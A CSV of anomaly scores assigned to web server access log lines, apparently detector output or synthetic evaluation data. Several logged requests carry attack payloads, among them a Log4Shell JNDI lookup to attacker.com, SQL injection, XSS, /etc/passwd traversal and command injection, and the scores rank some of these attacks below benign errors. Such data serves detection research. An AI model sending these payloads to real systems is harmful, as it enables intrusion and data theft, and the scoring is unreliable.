score_content,score_session,score_fused,score_fused_norm,line
1.9952625036239624,,1.9952625036239624,1.9952625036239624,137.2.161.17 - - [10/Jan/2025:12:14:15 +0000] "GET /contact HTTP/1.1" 200 17728 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9849776029586792,,1.9849776029586792,1.9849776029586792,166.210.241.19 - - [10/Jan/2025:12:14:20 +0000] "GET /contact HTTP/1.1" 200 14361 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.8711529970169067,,1.8711529970169067,1.8711529970169067,14.46.204.65 - - [10/Jan/2025:12:14:20 +0000] "GET /dashboard HTTP/1.1" 200 2500 "-" "python-requests/2.31.0"
2.061488628387451,,2.061488628387451,2.061488628387451,162.104.111.81 - - [10/Jan/2025:12:14:24 +0000] "GET /login HTTP/1.1" 200 14882 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.011631965637207,,2.011631965637207,2.011631965637207,194.191.150.12 - - [10/Jan/2025:12:14:29 +0000] "GET /admin HTTP/1.1" 201 2172 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.04682731628418,,24.04682731628418,24.04682731628418,196.238.113.98 - - [10/Jan/2025:12:14:33 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 9324 "-" "dirb/2.22"
24.059812545776367,,24.059812545776367,24.059812545776367,204.205.218.140 - - [10/Jan/2025:12:14:36 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12912 "https://www.google.com/" "curl/7.68.0"
30127.107421875,,30127.107421875,30127.107421875,142.224.143.37 - - [10/Jan/2025:12:14:38 +0000] "GET /profile HTTP/1.1" 429 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.000408172607422,,24.000408172607422,24.000408172607422,79.54.192.190 - - [10/Jan/2025:12:14:38 +0000] "GET /search?q=laptop HTTP/1.1" 200 2889 "https://example.com/" "sqlmap/1.5.10#stable"
0.25418031215667725,,0.25418031215667725,0.25418031215667725,158.214.65.50 - - [10/Jan/2025:12:14:39 +0000] "GET /assets/app.css HTTP/1.1" 200 7334 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30124.173828125,,30124.173828125,30124.173828125,119.166.141.19 - - [10/Jan/2025:12:14:44 +0000] "GET /index.html HTTP/1.1" 401 1124 "-" "curl/7.68.0"
30148.826171875,,30148.826171875,30148.826171875,33.172.168.61 - - [10/Jan/2025:12:14:46 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 429 731 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.899309158325195,,23.899309158325195,23.899309158325195,85.158.169.79 - - [10/Jan/2025:12:14:50 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 14866 "https://twitter.com/" "curl/7.68.0"
30126.830078125,,30126.830078125,30126.830078125,2.81.64.202 - - [10/Jan/2025:12:14:54 +0000] "GET /dashboard HTTP/1.1" 429 345 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.883301019668579,,2.883301019668579,2.883301019668579,225.123.119.115 - - [10/Jan/2025:12:14:56 +0000] "GET /assets/app.css HTTP/1.1" 301 10964 "https://example.com/" "curl/7.68.0"
0.2541312575340271,,0.2541312575340271,0.2541312575340271,216.72.220.212 - - [10/Jan/2025:12:14:59 +0000] "GET /assets/app.js HTTP/1.1" 204 2786 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.654260635375977,,4.654260635375977,4.654260635375977,218.130.162.8 - - [10/Jan/2025:12:15:00 +0000] "GET /about HTTP/1.1" 302 710 "https://twitter.com/" "python-requests/2.31.0"
30125.662109375,,30125.662109375,30125.662109375,67.140.229.139 - - [10/Jan/2025:12:15:03 +0000] "GET /api/products HTTP/1.1" 403 1129 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.0282819271087646,,2.0282819271087646,2.0282819271087646,131.24.102.94 - - [10/Jan/2025:12:15:05 +0000] "GET /logout HTTP/1.1" 200 16520 "-" "python-requests/2.31.0"
2.902521848678589,,2.902521848678589,2.902521848678589,115.41.46.145 - - [10/Jan/2025:12:15:10 +0000] "GET /assets/app.js HTTP/1.1" 302 4699 "https://www.google.com/" "python-requests/2.31.0"
1.990366816520691,,1.990366816520691,1.990366816520691,60.17.68.95 - - [10/Jan/2025:12:15:15 +0000] "GET /profile HTTP/1.1" 200 16079 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9870095252990723,,1.9870095252990723,1.9870095252990723,226.12.11.252 - - [10/Jan/2025:12:15:20 +0000] "GET /profile HTTP/1.1" 200 14997 "https://example.com/" "sqlmap/1.5.10#stable"
30125.716796875,,30125.716796875,30125.716796875,149.140.146.45 - - [10/Jan/2025:12:15:20 +0000] "GET /login HTTP/1.1" 400 539 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
2.0533695220947266,,2.0533695220947266,2.0533695220947266,250.233.58.133 - - [10/Jan/2025:12:15:22 +0000] "GET /about HTTP/1.1" 200 12431 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30147.716796875,,30147.716796875,30147.716796875,129.226.36.113 - - [10/Jan/2025:12:15:24 +0000] "GET /search?q=headphones HTTP/1.1" 403 13 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.029111623764038,,2.029111623764038,2.029111623764038,41.93.155.184 - - [10/Jan/2025:12:15:24 +0000] "GET /login HTTP/1.1" 200 6224 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9894789457321167,,1.9894789457321167,1.9894789457321167,123.54.152.42 - - [10/Jan/2025:12:15:27 +0000] "GET /contact HTTP/1.1" 200 15789 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.2456836700439453,,0.2456836700439453,0.2456836700439453,35.162.132.11 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.css HTTP/1.1" 200 5379 "https://www.google.com/" "python-requests/2.31.0"
0.30192989110946655,,0.30192989110946655,0.30192989110946655,154.249.145.164 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.js HTTP/1.1" 200 13385 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.369140625,,30147.369140625,30147.369140625,57.213.106.154 - - [10/Jan/2025:12:15:27 +0000] "GET /search?q=headphones HTTP/1.1" 401 349 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0494720935821533,,2.0494720935821533,2.0494720935821533,237.117.153.152 - - [10/Jan/2025:12:15:28 +0000] "GET /login HTTP/1.1" 200 11328 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.993804931640625,,1.993804931640625,1.993804931640625,221.233.130.176 - - [10/Jan/2025:12:15:31 +0000] "GET /contact HTTP/1.1" 200 17228 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30147.6953125,,30147.6953125,30147.6953125,10.225.201.137 - - [10/Jan/2025:12:15:35 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 403 1228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.03125,,30126.03125,30126.03125,167.111.134.108 - - [10/Jan/2025:12:15:38 +0000] "GET / HTTP/1.1" 403 1389 "-" "curl/7.68.0"
30147.556640625,,30147.556640625,30147.556640625,203.197.98.90 - - [10/Jan/2025:12:15:43 +0000] "GET /api/product?id=123 HTTP/1.1" 404 987 "https://twitter.com/" "python-requests/2.31.0"
2.03548002243042,,2.03548002243042,2.03548002243042,233.220.22.73 - - [10/Jan/2025:12:15:43 +0000] "GET /login HTTP/1.1" 200 7718 "https://twitter.com/" "python-requests/2.31.0"
4.895284175872803,,4.895284175872803,4.895284175872803,148.134.31.134 - - [10/Jan/2025:12:15:46 +0000] "GET / HTTP/1.1" 302 333 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8748301267623901,,1.8748301267623901,1.8748301267623901,40.110.167.150 - - [10/Jan/2025:12:15:51 +0000] "GET /dashboard HTTP/1.1" 200 3592 "https://example.com/" "curl/7.68.0"
1.980889916419983,,1.980889916419983,1.980889916419983,194.53.106.142 - - [10/Jan/2025:12:15:55 +0000] "GET /profile HTTP/1.1" 200 13123 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.9538631439209,,23.9538631439209,23.9538631439209,148.89.199.181 - - [10/Jan/2025:12:15:56 +0000] "GET /search?q=headphones HTTP/1.1" 200 10148 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
23.877546310424805,,23.877546310424805,23.877546310424805,26.55.131.103 - - [10/Jan/2025:12:16:01 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 5401 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.38759976625442505,,0.38759976625442505,0.38759976625442505,206.24.211.38 - - [10/Jan/2025:12:16:05 +0000] "GET /index.html HTTP/1.1" 200 273 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.18060874938965,,24.18060874938965,24.18060874938965,156.10.186.99 - - [10/Jan/2025:12:16:08 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2722 "https://twitter.com/" "dirb/2.22"
30125.412109375,,30125.412109375,30125.412109375,164.127.113.3 - - [10/Jan/2025:12:16:13 +0000] "GET /index.html HTTP/1.1" 429 358 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.01915168762207,,24.01915168762207,24.01915168762207,93.62.168.1 - - [10/Jan/2025:12:16:15 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1281 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.589216709136963,,4.589216709136963,4.589216709136963,151.52.133.4 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 301 13385 "-" "sqlmap/1.5.10#stable"
1.966467022895813,,1.966467022895813,1.966467022895813,58.156.247.50 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 200 9160 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.09929689764976501,,0.09929689764976501,0.09929689764976501,144.19.129.76 - - [10/Jan/2025:12:16:21 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3588 "-" "sqlmap/1.5.10#stable"
4.660805702209473,,4.660805702209473,4.660805702209473,145.124.198.63 - - [10/Jan/2025:12:16:25 +0000] "GET /login HTTP/1.1" 301 12456 "https://news.ycombinator.com/" "curl/7.68.0"
2.2553510665893555,,2.2553510665893555,2.2553510665893555,18.98.163.202 - - [10/Jan/2025:12:16:30 +0000] "GET / HTTP/1.1" 200 8548 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.965722680091858,,1.965722680091858,1.965722680091858,180.214.68.64 - - [10/Jan/2025:12:16:32 +0000] "GET /profile HTTP/1.1" 200 418 "-" "curl/7.68.0"
1.8849902153015137,,1.8849902153015137,1.8849902153015137,122.81.91.56 - - [10/Jan/2025:12:16:35 +0000] "GET /dashboard HTTP/1.1" 200 5948 "https://example.com/" "python-requests/2.31.0"
1.8752124309539795,,1.8752124309539795,1.8752124309539795,61.189.62.224 - - [10/Jan/2025:12:16:36 +0000] "GET /api/products HTTP/1.1" 200 6642 "https://www.google.com/" "curl/7.68.0"
30147.40625,,30147.40625,30147.40625,40.200.28.31 - - [10/Jan/2025:12:16:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 729 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30124.125,,30124.125,30124.125,159.81.127.230 - - [10/Jan/2025:12:16:41 +0000] "GET /wp-login.php HTTP/1.1" 401 760 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.0737016201019287,,2.0737016201019287,2.0737016201019287,33.14.135.205 - - [10/Jan/2025:12:16:42 +0000] "GET /login HTTP/1.1" 200 18996 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.950164794921875,,23.950164794921875,23.950164794921875,118.250.31.179 - - [10/Jan/2025:12:16:46 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 5827 "https://example.com/" "nikto/2.5.0"
23.855438232421875,,23.855438232421875,23.855438232421875,84.93.157.221 - - [10/Jan/2025:12:16:51 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 3401 "https://www.google.com/" "python-requests/2.31.0"
2.049522638320923,,2.049522638320923,2.049522638320923,94.48.128.109 - - [10/Jan/2025:12:16:55 +0000] "GET /login HTTP/1.1" 200 11342 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.673828125,,30125.673828125,30125.673828125,116.47.147.34 - - [10/Jan/2025:12:17:00 +0000] "GET /profile HTTP/1.1" 401 572 "https://www.google.com/" "python-requests/2.31.0"
24.058685302734375,,24.058685302734375,24.058685302734375,51.38.205.246 - - [10/Jan/2025:12:17:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12580 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.266733318567276,,0.266733318567276,0.266733318567276,229.218.162.133 - - [10/Jan/2025:12:17:03 +0000] "GET /assets/app.js HTTP/1.1" 200 4506 "https://example.com/" "python-requests/2.31.0"
0.35569530725479126,,0.35569530725479126,0.35569530725479126,16.56.209.66 - - [10/Jan/2025:12:17:06 +0000] "GET /index.html HTTP/1.1" 200 5452 "-" "Wget/1.20.3 (linux-gnu)"
2.0722005367279053,,2.0722005367279053,2.0722005367279053,143.239.208.66 - - [10/Jan/2025:12:17:09 +0000] "GET /login HTTP/1.1" 200 18461 "-" "curl/7.68.0"
23.907970428466797,,23.907970428466797,23.907970428466797,45.251.200.73 - - [10/Jan/2025:12:17:12 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 17743 "https://example.com/" "sqlmap/1.5.10#stable"
30147.494140625,,30147.494140625,30147.494140625,158.74.119.162 - - [10/Jan/2025:12:17:17 +0000] "GET /search?q=camera HTTP/1.1" 403 780 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9302890300750732,,1.9302890300750732,1.9302890300750732,104.218.233.19 - - [10/Jan/2025:12:17:22 +0000] "GET /dashboard HTTP/1.1" 200 18831 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8911495208740234,,1.8911495208740234,1.8911495208740234,155.166.102.70 - - [10/Jan/2025:12:17:24 +0000] "GET /dashboard HTTP/1.1" 204 8864 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.013593673706055,,24.013593673706055,24.013593673706055,219.6.33.187 - - [10/Jan/2025:12:17:29 +0000] "GET /search?q=camera HTTP/1.1" 200 6125 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0556905269622803,,2.0556905269622803,2.0556905269622803,27.25.17.240 - - [10/Jan/2025:12:17:34 +0000] "GET /about HTTP/1.1" 200 13110 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.5599116683006287,,0.5599116683006287,0.5599116683006287,27.68.159.40 - - [10/Jan/2025:12:17:34 +0000] "GET /.env HTTP/1.1" 200 2827 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.982182264328003,,1.982182264328003,1.982182264328003,34.135.215.44 - - [10/Jan/2025:12:17:36 +0000] "GET /logout HTTP/1.1" 200 4242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30125.595703125,,30125.595703125,30125.595703125,250.223.139.240 - - [10/Jan/2025:12:17:41 +0000] "GET /dashboard HTTP/1.1" 401 956 "https://twitter.com/" "curl/7.68.0"
0.14386636018753052,,0.14386636018753052,0.14386636018753052,162.192.163.225 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 15060 "https://twitter.com/" "dirb/2.22"
30125.818359375,,30125.818359375,30125.818359375,139.59.207.23 - - [10/Jan/2025:12:17:49 +0000] "GET /logout HTTP/1.1" 404 986 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.33273565769195557,,0.33273565769195557,0.33273565769195557,134.209.195.218 - - [10/Jan/2025:12:17:51 +0000] "GET /assets/app.css HTTP/1.1" 200 103 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.889011859893799,,4.889011859893799,4.889011859893799,243.194.123.77 - - [10/Jan/2025:12:17:53 +0000] "GET / HTTP/1.1" 301 16219 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.245814561843872,,2.245814561843872,2.245814561843872,106.226.144.112 - - [10/Jan/2025:12:17:55 +0000] "GET / HTTP/1.1" 200 6279 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30147.392578125,,30147.392578125,30147.392578125,68.21.109.161 - - [10/Jan/2025:12:17:56 +0000] "GET /search?q=laptop HTTP/1.1" 400 451 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0695302486419678,,2.0695302486419678,2.0695302486419678,208.69.106.49 - - [10/Jan/2025:12:18:00 +0000] "GET /login HTTP/1.1" 200 17530 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.023588180541992,,24.023588180541992,24.023588180541992,180.160.126.49 - - [10/Jan/2025:12:18:01 +0000] "GET /search?q=camera HTTP/1.1" 201 9017 "-" "curl/7.68.0"
2.017167329788208,,2.017167329788208,2.017167329788208,73.69.33.184 - - [10/Jan/2025:12:18:02 +0000] "GET /admin HTTP/1.1" 200 3451 "-" "nikto/2.5.0"
2.0493814945220947,,2.0493814945220947,2.0493814945220947,108.80.202.205 - - [10/Jan/2025:12:18:03 +0000] "GET /admin HTTP/1.1" 200 11303 "https://example.com/" "nikto/2.5.0"
0.35319921374320984,,0.35319921374320984,0.35319921374320984,15.69.199.101 - - [10/Jan/2025:12:18:06 +0000] "GET /index.html HTTP/1.1" 200 4887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30125.92578125,,30125.92578125,30125.92578125,32.250.197.183 - - [10/Jan/2025:12:18:09 +0000] "GET /login HTTP/1.1" 400 25 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3460741937160492,,0.3460741937160492,0.3460741937160492,134.171.252.54 - - [10/Jan/2025:12:18:12 +0000] "GET /index.html HTTP/1.1" 200 3178 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.871221661567688,,1.871221661567688,1.871221661567688,191.240.141.134 - - [10/Jan/2025:12:18:17 +0000] "GET /dashboard HTTP/1.1" 200 1482 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8575924634933472,,1.8575924634933472,1.8575924634933472,222.171.56.250 - - [10/Jan/2025:12:18:20 +0000] "GET /api/products HTTP/1.1" 200 1806 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.2577409744262695,,2.2577409744262695,2.2577409744262695,150.31.102.203 - - [10/Jan/2025:12:18:25 +0000] "GET / HTTP/1.1" 200 9147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.5302734375,,26.5302734375,26.5302734375,96.198.23.64 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=headphones HTTP/1.1" 301 5178 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.7109375,,30125.7109375,30125.7109375,16.16.92.166 - - [10/Jan/2025:12:18:25 +0000] "GET /dashboard HTTP/1.1" 404 1280 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.92363166809082,,23.92363166809082,23.92363166809082,202.166.194.89 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18396 "https://www.google.com/" "nikto/2.5.0"
4.590691566467285,,4.590691566467285,4.590691566467285,231.11.125.181 - - [10/Jan/2025:12:18:25 +0000] "GET /profile HTTP/1.1" 302 8314 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.938007354736328,,23.938007354736328,23.938007354736328,140.90.83.188 - - [10/Jan/2025:12:18:27 +0000] "GET /search?q=headphones HTTP/1.1" 200 6215 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.2696972191333771,,0.2696972191333771,0.2696972191333771,116.76.210.68 - - [10/Jan/2025:12:18:31 +0000] "GET /assets/app.js HTTP/1.1" 200 5179 "https://example.com/" "python-requests/2.31.0"
3.2045743465423584,,3.2045743465423584,3.2045743465423584,159.220.94.199 - - [10/Jan/2025:12:18:34 +0000] "GET /.env HTTP/1.1" 302 713 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.6113345623016357,,0.6113345623016357,0.6113345623016357,197.142.40.157 - - [10/Jan/2025:12:18:39 +0000] "GET /.env HTTP/1.1" 200 16403 "https://example.com/" "python-requests/2.31.0"
1.9387974739074707,,1.9387974739074707,1.9387974739074707,12.214.241.34 - - [10/Jan/2025:12:18:42 +0000] "GET /contact HTTP/1.1" 200 2284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.910987854003906,,23.910987854003906,23.910987854003906,165.215.100.169 - - [10/Jan/2025:12:18:43 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 18810 "https://twitter.com/" "nikto/2.5.0"
2.0338635444641113,,2.0338635444641113,2.0338635444641113,156.184.19.4 - - [10/Jan/2025:12:18:47 +0000] "GET /login HTTP/1.1" 200 7332 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.38786089420318604,,0.38786089420318604,0.38786089420318604,211.95.204.182 - - [10/Jan/2025:12:18:47 +0000] "GET /index.html HTTP/1.1" 200 13729 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30125.7734375,,30125.7734375,30125.7734375,242.56.246.133 - - [10/Jan/2025:12:18:49 +0000] "GET /about HTTP/1.1" 400 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.053565979003906,,24.053565979003906,24.053565979003906,169.64.146.161 - - [10/Jan/2025:12:18:54 +0000] "GET /search?q=laptop HTTP/1.1" 200 17342 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.666292667388916,,4.666292667388916,4.666292667388916,92.173.118.180 - - [10/Jan/2025:12:18:59 +0000] "GET /contact HTTP/1.1" 304 18992 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.31225788593292236,,0.31225788593292236,0.31225788593292236,87.169.41.137 - - [10/Jan/2025:12:18:59 +0000] "GET /assets/app.js HTTP/1.1" 200 16637 "https://news.ycombinator.com/" "python-requests/2.31.0"
30125.560546875,,30125.560546875,30125.560546875,196.163.111.212 - - [10/Jan/2025:12:19:01 +0000] "GET /dashboard HTTP/1.1" 400 844 "https://example.com/" "sqlmap/1.5.10#stable"
1.915522813796997,,1.915522813796997,1.915522813796997,238.191.66.93 - - [10/Jan/2025:12:19:05 +0000] "GET /api/products HTTP/1.1" 200 18130 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11036.5576171875,,11036.5576171875,11036.5576171875,5.133.35.228 - - [10/Jan/2025:12:19:08 +0000] "GET /wp-login.php HTTP/1.1" 502 1220 "-" "python-requests/2.31.0"
30125.763671875,,30125.763671875,30125.763671875,198.211.242.177 - - [10/Jan/2025:12:19:10 +0000] "GET /api/products HTTP/1.1" 401 44 "https://twitter.com/" "curl/7.68.0"
0.2828882932662964,,0.2828882932662964,0.2828882932662964,92.40.36.68 - - [10/Jan/2025:12:19:14 +0000] "GET /assets/app.css HTTP/1.1" 200 15185 "https://twitter.com/" "curl/7.68.0"
2.017730474472046,,2.017730474472046,2.017730474472046,146.235.56.188 - - [10/Jan/2025:12:19:15 +0000] "GET /logout HTTP/1.1" 200 13200 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9694931507110596,,1.9694931507110596,1.9694931507110596,10.188.207.148 - - [10/Jan/2025:12:19:18 +0000] "GET /contact HTTP/1.1" 200 9943 "-" "Wget/1.20.3 (linux-gnu)"
1.9167659282684326,,1.9167659282684326,1.9167659282684326,107.239.223.31 - - [10/Jan/2025:12:19:18 +0000] "GET /dashboard HTTP/1.1" 200 14331 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
